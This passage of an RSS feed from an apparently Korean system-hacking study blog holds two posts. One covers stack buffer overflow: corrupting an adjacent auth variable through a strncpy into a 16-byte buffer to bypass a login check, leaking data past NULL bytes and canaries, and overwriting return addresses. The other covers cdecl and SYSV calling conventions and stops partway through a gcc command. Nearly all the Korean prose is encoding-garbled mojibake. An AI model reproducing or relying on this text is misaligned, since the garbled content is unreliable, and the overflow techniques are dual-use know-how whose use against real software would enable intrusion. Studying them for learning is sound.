      &lt;li&gt;â€œë²„í¼â€, ì¦‰ ì–´ë–¤ ë³€ìˆ˜ë“  ë°ì´í„°ë“  ë‹´ê¸°ë„ë¡ &lt;strong&gt;í• ë‹¹ëœ ë©”ëª¨ë¦¬ ì˜ì—­ì˜ í¬ê¸°ë¥¼ ë›°ì–´ë„˜ëŠ” ë°ì´í„°ë¥¼ ì¸í’‹&lt;/strong&gt;í–ˆì„ ë–„ ë°œìƒí•œë‹¤.&lt;/li&gt;
      &lt;li&gt;ì¼ë°˜ì ìœ¼ë¡œ &lt;strong&gt;ë²„í¼ëŠ” ë©”ëª¨ë¦¬ìƒì— ì—°ì†í•´ì„œ í• ë‹¹&lt;/strong&gt;ë˜ì–´ ìˆê¸° ë•Œë¬¸ì—, ì–´ë–¤ ë²„í¼ì—ì„œì˜ ì˜¤ë²„í”Œë¡œìš°ëŠ” &lt;strong&gt;ë’¤ì— ìˆëŠ” ë²„í¼ë“¤ì˜ ê°’ì´ ì¡°ì‘&lt;/strong&gt;ë˜ê²Œ í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ê·¸ ì–´ë–¤ ë©”ëª¨ë¦¬ ì˜ì—­ì—ì„œ ë°œìƒí•˜ë”ë¼ë„ ë§¤ìš° ì‹¬ê°í•œ ë³´ì•ˆ ìœ„í˜‘ìœ¼ë¡œ ì´ì–´ì§„ë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ìŠ¤íƒ-ë²„í¼-ì˜¤ë²„í”Œë¡œìš°&quot;&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ìŠ¤íƒ ì˜ì—­ì—ì„œ í• ë‹¹í•œ ë²„í¼ê°€ ì˜¤ë²„í”Œë¡œìš°ë˜ëŠ” ê²ƒ.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;2-ì¤‘ìš”-ë°ì´í„°-ë³€ì¡°&quot;&gt;2. ì¤‘ìš” ë°ì´í„° ë³€ì¡°&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;BOF ë°œìƒ ë²„í¼ ë’¤ì— ì¤‘ìš”í•œ ë°ì´í„°ê°€ ìˆë‹¤ë©´, í•´ë‹¹ ë°ì´í„°ê°€ ë³€ì¡°ë¨ìœ¼ë¡œì¨ ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìˆë‹¤.
    &lt;ul&gt;
      &lt;li&gt;í‘œí˜„ì‹ì˜ ë³€ì¡°&lt;/li&gt;
      &lt;li&gt;í†µì‹  ì£¼ì†Œ ë³€ì¡°&lt;/li&gt;
      &lt;li&gt;â€¦etc&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì˜ˆì œë¥¼ ë¶„ì„í•˜ë©° BOFì˜ ê°ì„ ì¡ì•„ ë³´ì. ì‚¬ì‹¤ ë‚˜ëŠ” ì €ë²ˆì— í’€ì—ˆë˜ ë¬¸ì œ ì •ë„ë¥¼ ì˜ˆìƒí•˜ê³  ì—ì´ ë˜‘ê°™ì€ ì´ì•¼ê¸´ê°€~ í•˜ë©° ë°©ì‹¬í–ˆëŠ”ë°, ì „í˜€ ì•„ë‹ˆì—ˆë‹¤. ì„¤ëª…ì„ ì½ê³  ë’¤í†µìˆ˜ë¥¼ í•œ ëŒ€ ë§ì€ ê¸°ë¶„ì´ì—ˆê¸° ë•Œë¬¸ì—, ë‚˜ì™€ ë¹„ìŠ·í•œ ì´ˆë³´ì ë¶„ë“¤ë„ ì´ê±´ ê¼­ ë³´ì…¨ìœ¼ë©´ ì¢‹ê² ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack52/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì›ë˜ main í•¨ìˆ˜ê°€ ë”°ë¡œ ìˆëŠ”ë°, ê°€ì¥ ì¤‘ìš”í•œ check_auth í•¨ìˆ˜ë§Œ ì˜ë¼ì„œ ê°€ì ¸ì™”ë‹¤. ì—¬ê¸°ì—ì„œ ì§‘ì¤‘í•´ë³¼ ê²ƒì€, temp[16]ê³¼ strncpy(temp, password, strlen(password))ì´ë‹¤. strncpy ìì²´ê°€ BOFì— ì·¨ì•½í•œ í•¨ìˆ˜ì¸ ë°ë‹¤ê°€ temp[16]ì€ 16ë°”ì´íŠ¸ë¡œ í¬ê¸°ê°€ ì •í•´ì§„ ë°°ì—´ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰, strncpyë¥¼ ëŒë¦´ ë•Œ 16ë°”ì´íŠ¸ë¥¼ ì´ˆê³¼í•˜ëŠ” ë¬¸ìì—´ì„ ì „ë‹¬í•œë‹¤ë©´ temp ì§€ì—­ ë³€ìˆ˜ë¥¼ ë‹´ëŠ” ìŠ¤íƒì˜ ë²„í¼ê°€ overflow ë˜ë©´ì„œ ë°”ë¡œ ê·¸ ë°‘ì— í• ë‹¹ëœ auth ì§€ì—­ ë³€ìˆ˜ì˜ ë°ì´í„°ê°€ ì˜¤ì—¼ë  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ ì·¨ì•½ì ì„ ì´ìš©í•´ ì‹¤ì œ ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ê°€ ì•„ë‹Œ ì•„ë¬´ ë°ì´í„°ë‚˜ ì…ë ¥í•˜ë©´ì„œ auth ë²„í¼ì˜ ë°ì´í„°ê°€ 1ë¡œ ë³€ê²½ë˜ë„ë¡ ë³€ì¡°í•œë‹¤ë©´ ì¸ì¦ì„ í†µê³¼í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;3-ë°ì´í„°-ìœ ì¶œ&quot;&gt;3. ë°ì´í„° ìœ ì¶œ&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Cì–¸ì–´ì˜ ê²½ìš° ë¬¸ìì—´ì˜ ì¢…ê²°ì€ NULL byteë¡œ í‘œí˜„ë˜ê³ , ìŠ¤íƒì—ì„œ ë°ì´í„°ë¥¼ ì½ì–´ì˜¬ ë•Œ NULL byte ì „ê¹Œì§€ ì½ì–´ì˜´&lt;/li&gt;
  &lt;li&gt;ì¦‰, ì–´ë–¤ ë²„í¼ì— ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì¼ìœ¼í‚´ â†’ ë‹¤ë¥¸ ë²„í¼ì™€ì˜ ì‚¬ì´ì— ìˆëŠ” NULL byte ëª¨ë‘ ì œê±° â†’ í•´ë‹¹ ë²„í¼ì˜ ë°ì´í„° ìœ ì¶œ ê°€ëŠ¥&lt;/li&gt;
  &lt;li&gt;Stack Canaryë¥¼ ì´ëŸ° ì‹ìœ¼ë¡œ ë®ì–´ì”Œì›Œì„œ ë‹¤ìŒ ë²„í¼ì˜ ë°ì´í„°ê°€ ìœ ì¶œë˜ê²Œë” í•  ìˆ˜ ìˆê² ë‹¤!&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;4-ì‹¤í–‰-íë¦„-ì¡°ì‘&quot;&gt;4. ì‹¤í–‰ íë¦„ ì¡°ì‘&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ì„ ìƒì„±í•  ë•Œ, ì´ì „ ìŠ¤íƒ í”„ë ˆì„ì˜ ë§¨ ê¼­ëŒ€ê¸°ì— ë¦¬í„´ ì£¼ì†Œë¥¼ ì €ì¥í•œë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•…ìš©
    &lt;ul&gt;
      &lt;li&gt;[ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„: ì§€ì—­ ë³€ìˆ˜ë“¤â€¦]&lt;/li&gt;
      &lt;li&gt;[ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„: SFP(ì´ì „ ìŠ¤íƒ í”„ë ˆì„ì˜ í•¨ìˆ˜ì—ì„œ ì‚¬ìš©í•˜ë˜ ìŠ¤íƒì˜ ë°”ë‹¥ ì£¼ì†Œ)]&lt;/li&gt;
      &lt;li&gt;[ì˜›ë‚  ìŠ¤íƒ í”„ë ˆì„: Return Address]&lt;/li&gt;
      &lt;li&gt;ìˆœì´ë¼ëŠ” ê±¸ ìŠì§€ ë§ì!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì¼ìœ¼ì¼œ, ë¦¬í„´ ì£¼ì†Œë¥¼ ì¡°ì‘í•´ ì›í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ê°€ ì‹¤í–‰ë˜ê²Œë” í•¨&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 17 Aug 2022 14:25:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step5-2/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step5-2/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5</title>
        <description>&lt;h1 id=&quot;stage-5&quot;&gt;STAGE 5&lt;/h1&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½ì˜ ì •ì˜ì™€ ì¢…ë¥˜ ì•Œê¸°&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdecl&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSV&lt;/code&gt; í˜¸ì¶œ ê·œì•½ì´ ë¬´ì—‡ì¸ì§€ ì•Œê¸°&lt;/li&gt;
  &lt;li&gt;ë‹¤ìŒ ì½”ìŠ¤ì˜ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ì˜ ìœ„í—˜ì„± ì•Œê¸°&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-calling-convention&quot;&gt;1. Calling Convention&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½: í•¨ìˆ˜ì˜ í˜¸ì¶œ ë° ë°˜í™˜ì— ëŒ€í•œ ì•½ì†&lt;/li&gt;
  &lt;li&gt;í•œ í•¨ìˆ˜ Aì—ì„œ ë‹¤ë¥¸ í•¨ìˆ˜ Bë¥¼ í˜¸ì¶œí•˜ëŠ” ê²½ìš°,
    &lt;ul&gt;
      &lt;li&gt;Caller(í˜¸ì¶œì): A
        &lt;ul&gt;
          &lt;li&gt;Callerì˜ Stack Frame, Return Addressë¥¼ ì €ì¥í•œë‹¤.&lt;/li&gt;
          &lt;li&gt;CallerëŠ” Calleeê°€ ìš”êµ¬í•˜ëŠ” ì¸ìë¥¼ ì „ë‹¬í•´ ì¤˜ì•¼ í•œë‹¤.&lt;/li&gt;
          &lt;li&gt;CallerëŠ” Calleeì˜ ì‹¤í–‰ì´ ì¢…ë£Œë  ë•Œì˜ ë¦¬í„´ê°’ì„ ì „ë‹¬ë°›ì•„ì•¼ í•œë‹¤.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Callee(í”¼í˜¸ì¶œì): B&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½ ì ìš©ì˜ ì£¼ì²´: &lt;strong&gt;ì»´íŒŒì¼ëŸ¬&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;ê·¸ëŸ¬ë‚˜ ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ë§Œë“¤ê±°ë‚˜, ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ì´í•´í•˜ë ¤ë©´ Calling Conventionì„ ì•Œì•„ì•¼ë§Œ í•œë‹¤.&lt;/p&gt;

        &lt;p&gt;â†’ ì‹œìŠ¤í…œ í•´í‚¹ì˜ ê¸°ë³¸&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;2-í•¨ìˆ˜-í˜¸ì¶œ-ê·œì•½ì˜-ì¢…ë¥˜&quot;&gt;2. í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½ì˜ ì¢…ë¥˜&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;ì»´íŒŒì¼ëŸ¬ëŠ” ì§€ì›í•˜ëŠ” í˜¸ì¶œ ê·œì•½ ì¤‘ CPU ì•„í‚¤í…ì²˜ì— ê°€ì¥ ì í•©í•œ ê²ƒì„ ì„ í•µí•œë‹¤.
    &lt;ul&gt;
      &lt;li&gt;x86(32bit): &lt;strong&gt;ìŠ¤íƒìœ¼ë¡œ ì¸ì ì „ë‹¬&lt;/strong&gt;; ë ˆì§€ìŠ¤í„°ë¡œ Calleeì˜ ì¸ìë¥¼ ì „ë‹¬í•˜ê¸°ì—ëŠ” ë ˆì§€ìŠ¤í„° ìˆ˜ê°€ ë„ˆë¬´ ì ìŒ.&lt;/li&gt;
      &lt;li&gt;x86-64(64bit): &lt;strong&gt;ë ˆì§€ìŠ¤í„°ë¡œ ì¸ì ì „ë‹¬&lt;/strong&gt;(&lt;strong&gt;ì ì€ ìˆ˜&lt;/strong&gt;ë¼ë©´), ì¸ìê°€ &lt;strong&gt;ë„ˆë¬´ ë§ë‹¤ë©´ ìŠ¤íƒ&lt;/strong&gt; ì‚¬ìš©. ë ˆì§€ìŠ¤í„° ìˆ˜ê°€ ì¶©ë¶„í•œ í¸.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ê·¸ëŸ¬ë‚˜ ì‚¬ìš©í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ì˜ ì¢…ë¥˜ê°€ ë‹¬ë¼ì§ˆ ê²½ìš°, ë™ì¼ ì•„í‚¤í…ì²˜ ìƒì—ì„œë¼ë„ ë‹¤ë¥¸ í˜¸ì¶œ ê·œì•½ì´ ì ìš©ë  ìˆ˜ ìˆë‹¤.
    &lt;ul&gt;
      &lt;li&gt;Cì–¸ì–´ ì»´íŒŒì¼ ì‹œ:
        &lt;ul&gt;
          &lt;li&gt;Windows-MSVC
            &lt;ul&gt;
              &lt;li&gt;x86-64ì—ì„œ MSx64 calling convention ì‚¬ìš©&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Linux-gcc
            &lt;ul&gt;
              &lt;li&gt;x86-64ì—ì„œ SYSTEM V calling convention ì‚¬ìš©&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ëŒ€í‘œì ì¸ Calling Conventionì˜ ì¢…ë¥˜:
    &lt;ul&gt;
      &lt;li&gt;x86 architecture:
        &lt;ul&gt;
          &lt;li&gt;cdecl&lt;/li&gt;
          &lt;li&gt;stdcall&lt;/li&gt;
          &lt;li&gt;fastcall&lt;/li&gt;
          &lt;li&gt;thiscall&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;x86-64 architecture:
        &lt;ul&gt;
          &lt;li&gt;SYSTEM V AMD64 ABIì˜ Calling Convention&lt;/li&gt;
          &lt;li&gt;MS ABIì˜ Calling Convention&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;3-x86í˜¸ì¶œ-ê·œì•½-cdecl&quot;&gt;3. x86í˜¸ì¶œ ê·œì•½: cdecl&lt;/h1&gt;

&lt;h2 id=&quot;ë“¤ì–´ê°€ê¸°-ì „ì—&quot;&gt;ë“¤ì–´ê°€ê¸° ì „ì—:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;x86ì•„í‚¤í…ì²˜ â†’ ì ì€ ë ˆì§€ìŠ¤í„° â†’ ë ˆì§€ìŠ¤í„°ì— ì—¬ìœ  ì—†ìŒ â†’ ìŠ¤íƒì„ í†µí•´ Callerê°€ Calleeì—ê²Œ ì¸ì ì „ë‹¬
    &lt;ul&gt;
      &lt;li&gt;ì¸ì ì „ë‹¬ì— ì‚¬ìš©ëœ ìŠ¤íƒì€ Callerê°€ ì •ë¦¬í•œë‹¤.&lt;/li&gt;
      &lt;li&gt;ìŠ¤íƒì„ í†µí•´ ì¸ìë¥¼ ì „ë‹¬í•  ë•Œ, ë§ˆì§€ë§‰ ì¸ìë¶€í„° ì²« ë²ˆì§¸ ì¸ìê¹Œì§€ ê±°ê¾¸ë¡œ ìŠ¤íƒì— push
        &lt;ul&gt;
          &lt;li&gt;ë‹¹ì—°í•˜ë‹¤; ìŠ¤íƒì€ LIFOêµ¬ì¡°ë¡œ ê°€ì¥ ìœ„ì—ì„œë¶€í„° pop í•˜ë‹ˆê¹Œ, ì›í•˜ëŠ” ìˆœì„œëŒ€ë¡œ ì¸ìë¥¼ ì „ë‹¬í•˜ê³  ì‹¶ë‹¤ë©´ ì¸ìë¥¼ ìŠ¤íƒì— ê·¸ ì—­ìˆœìœ¼ë¡œ push í•´ì¤˜ì•¼ ì»´í“¨í„°ê°€ ì •ìˆœìœ¼ë¡œ ì½ì„ ìˆ˜ ìˆë‹¤.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ì‹¤ìŠµ&quot;&gt;ì‹¤ìŠµ&lt;/h2&gt;

&lt;p&gt;cdecl calling conventionì„ ì§ì ‘ í™•ì¸í•´ ë³´ê¸° ìœ„í•´ ë¦¬ëˆ…ìŠ¤ í™˜ê²½ì—ì„œ gccë¥¼ ì´ìš©í•´ cì–¸ì–´ë¥¼ ì–´ì…ˆë¸”ë¦¬ ì†ŒìŠ¤ íŒŒì¼ë¡œ ì»´íŒŒì¼í•´ ë³´ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;ì»´íŒŒì¼í•œ ì½”ë“œëŠ” ë‹¨ìˆœíˆ Callerì—ì„œ Calleeì—ê²Œ 1, 2ë¥¼ ì¸ìë¡œ ë„˜ê²¨ì£¼ëŠ” ë™ì‘ì„ í•˜ëŠ” ì½”ë“œì˜€ë‹¤.&lt;/p&gt;

&lt;p&gt;ì»´íŒŒì¼ ê²°ê³¼ë¡œ ë„ì¶œëœ ì–´ì…ˆë¸”ë¦¬ì–´ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee í•¨ìˆ˜ì˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œì™€ Caller í•¨ìˆ˜ì˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤. Caller ë‚´ë¶€ì—ì„œ Calleeë¥¼ í˜¸ì¶œí–ˆìœ¼ë¯€ë¡œ í•´ë‹¹ ë™ì‘ì— ì§‘ì¤‘í•´ ë³´ì.&lt;/p&gt;

&lt;p&gt;Callerì—ì„œ Calleeì—ê²Œ ì¸ìë¥¼ ì „ë‹¬í•  ë•Œ, ì½”ë“œ ìƒì—ì„œëŠ” Callee(1, 2)ë¡œ ì „ë‹¬í–ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œ ìƒì—ì„œëŠ” arg2ì¸ 2ê°€ ë¨¼ì € pushë˜ê³ , arg1ì¸ 1ì´ ë‚˜ì¤‘ì— pushë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. ì¦‰, x86 architecture calling conventionì˜ ì£¼ìš” íŠ¹ì§•ì¸ &lt;strong&gt;â€˜Calleeì˜ ì¸ìëŠ” Callerê°€ ìŠ¤íƒì— ì—­ìˆœìœ¼ë¡œ ì „ë‹¬í•œë‹¤â€™&lt;/strong&gt;ê°€ ë‘ë“œëŸ¬ì¡Œë‹¤.&lt;/p&gt;

&lt;p&gt;ë˜í•œ Calleeë¥¼ í˜¸ì¶œí•˜ê³ , Calleeê°€ ë¦¬í„´ëœ ì´í›„ ëŒì•„ì˜¨ ì½”ë“œ í”Œë¡œìš°ì—ì„œ Callerì˜ í–‰ë™ë„ ëˆˆì—¬ê²¨ë³¼ ë§Œí•˜ë‹¤. espì— 8ì„ ë”í•¨ìœ¼ë¡œì¨(ìŠ¤íƒì˜ í¬ê¸°ë¥¼ ë©”ëª¨ë¦¬ ì£¼ì†Œ 8ë§Œí¼ ì¤„ì¸ë‹¤) &lt;strong&gt;ìŠ¤íƒì„ ì •ë¦¬í•˜ëŠ” í–‰ìœ„&lt;/strong&gt;ë¥¼ í™•ì¸í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë‹¤. ì¸ìë¥¼ ë‘ ê°œ ì „ë‹¬í–ˆìœ¼ë¯€ë¡œ ê°ê° int í˜• 4byteì”© 8byteê°€ ëŠ˜ì–´ë‚˜ ìˆë˜ ìŠ¤íƒì„ Calleeë¥¼ í˜¸ì¶œí•˜ê¸° ì§ì „ì˜ í¬ê¸°ë¡œ ëŒë ¤ë†“ì€ ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ìŠ¤íƒ ì •ë¦¬ì™€ ê´€ë ¨í•´, Calleeì˜ í–‰ë™ë„ í™•ì¸í•´ ë‘ì. CalleeëŠ” ìŠ¤íƒì— ì•„ë¬´ëŸ° ì¡°ì‘ë„ ê°€í•˜ì§€ ì•Šê³  ë¦¬í„´í•œë‹¤. ì¦‰, x86 architectureì˜ calling convention ì¤‘ &lt;strong&gt;cdecl calling conventionì€ Calleeê°€ ì•„ë‹Œ Callerê°€ ìŠ¤íƒì„ ì •ë¦¬í•œë‹¤ëŠ” ì ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;4-x86-64-í˜¸ì¶œ-ê·œì•½-sysv&quot;&gt;4. x86-64 í˜¸ì¶œ ê·œì•½: SYSV&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;ë¦¬ëˆ…ìŠ¤ëŠ” SYSTEM V(SYSV) Application Binary Interface(ABI)ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë§Œë“¤ì–´ì¡Œë‹¤.
    &lt;ul&gt;
      &lt;li&gt;SYSV ABIë€? &lt;a href=&quot;https://wiki.osdev.org/System_V_ABI&quot;&gt;[ìì„¸í•œ ì„¤ëª…]&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;A set of specifications that detailÂ &lt;a href=&quot;https://wiki.osdev.org/Calling_Conventions&quot;&gt;calling conventions&lt;/a&gt;,Â &lt;a href=&quot;https://wiki.osdev.org/Object_Files&quot;&gt;object file formats&lt;/a&gt;,Â &lt;a href=&quot;https://wiki.osdev.org/Executable_Formats&quot;&gt;executable file formats&lt;/a&gt;, dynamic linking semantics, and much more for systems that complies with theÂ &lt;em&gt;X/Open Common Application Environment Specification&lt;/em&gt; and theÂ &lt;em&gt;System V Interface Definition.&lt;/em&gt;&lt;/li&gt;
          &lt;li&gt;ELF í¬ë§·, ë§í‚¹ ë°©ë²•, í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½ ë“±ì˜ ë‚´ìš©ì„ ê°€ì§€ê³  ìˆìŒ&lt;/li&gt;
          &lt;li&gt;ê·¸ ì™¸ ìœ„ì— ëª…ì‹œëœ Specification/Definitionì„ ì´ìš©í•´ ì»´íŒŒì¼ë˜ëŠ” ì‹œìŠ¤í…œ ì „ìš© ì •ë³´ë¥¼ ê°€ì§€ê³  ìˆìŒ&lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;ì¦‰, ì»´íŒŒì¼ê³¼ ë§¤ìš° ë°€ì ‘í•œ ì—°ê´€ â†’ ë¦¬ëˆ…ìŠ¤ì˜ ë°”ì´ë„ˆë¦¬ íŒŒì¼ë“¤ì€ ë¬´ì¡°ê±´ SYSV ABIì™€ ì—°ê´€ë˜ì–´ ìˆìŒ&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%201.jpeg&quot; alt=&quot;ì‹¤ì œë¡œ file ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ ë¦¬ëˆ…ìŠ¤ì˜ ë°”ì´ë„ˆë¦¬ íŒŒì¼ë“¤ì˜ ì¢…ë¥˜(íƒ€ì…)ì„ í™•ì¸í•´ ë³¸ ê²°ê³¼. SYSVì— ëª…ì‹œëœ ê·œì•½ì„ ë”°ë¼ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.&quot; /&gt;&lt;/p&gt;

            &lt;p&gt;ì‹¤ì œë¡œ file ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ ë¦¬ëˆ…ìŠ¤ì˜ ë°”ì´ë„ˆë¦¬ íŒŒì¼ë“¤ì˜ ì¢…ë¥˜(íƒ€ì…)ì„ í™•ì¸í•´ ë³¸ ê²°ê³¼. SYSVì— ëª…ì‹œëœ ê·œì•½ì„ ë”°ë¼ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SYSVì—ì„œ ì •ì˜ëœ í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½:
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;6ê°œì˜ ì¸ìë¥¼ RDI, RSI, RDX, RCX, R8, R9ì— ìˆœì„œëŒ€ë¡œ ì €ì¥í•´ ì „ë‹¬í•œë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;em&gt;64bitì´ë¯€ë¡œ ë ˆì§€ìŠ¤í„° ìˆ˜ê°€ ì¶©ë¶„í•´ì„œ ì›¬ë§Œí¼ ê°ë‹¹ ê°€ëŠ¥í•œ ìˆ˜ì˜ ì¸ìë©´ ë ˆì§€ìŠ¤í„°ì— ë‹´ì•„ ì „ë‹¬í•œëŒ”ë‹¤!&lt;/em&gt;&lt;/p&gt;

        &lt;p&gt;&lt;em&gt;ì¦‰, ë” ë§ì€ ì¸ìë¥¼ ì „ë‹¬í•´ì•¼ í•  ë•ŒëŠ” ìŠ¤íƒì„ ì¶”ê°€ë¡œ ì“´ë‹¤.&lt;/em&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Callerì—ì„œ&lt;/strong&gt; ì¸ì ì „ë‹¬ì— ì‚¬ìš©ëœ &lt;strong&gt;ìŠ¤íƒì„ ì •ë¦¬&lt;/strong&gt;í•œë‹¤.&lt;/li&gt;
      &lt;li&gt;í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì€ RAXë¡œ ì „ë‹¬í•œë‹¤. ë§Œì¼ syscall calleeë¼ë©´ í•´ë‹¹ calleeì˜ ì¢…ë¥˜ë¥¼ RAXë¡œ ì§€ì •í•´ callí•œë‹¤.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SYSV Calling Conventionì„ gdbë¡œ ìì„¸íˆ ì•Œì•„ë³´ì.&lt;/p&gt;

&lt;h2 id=&quot;gdbë¡œ-sysv-calling-convention-ì•Œì•„ë³´ê¸°&quot;&gt;GDBë¡œ SYSV Calling Convention ì•Œì•„ë³´ê¸°&lt;/h2&gt;

&lt;h3 id=&quot;ì½”ë“œ-ì»´íŒŒì¼&quot;&gt;ì½”ë“œ ì»´íŒŒì¼&lt;/h3&gt;

&lt;p&gt;ì•„ë˜ì™€ ê°™ì€ ì½”ë“œë¥¼ ì»´íŒŒì¼í•˜ì—¬ ì‹¤í–‰í•´ ë³´ì.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì»´íŒŒì¼ ì˜µì…˜ì€ ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fno-asynchronous-unwind-tables&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-masm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;intel &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
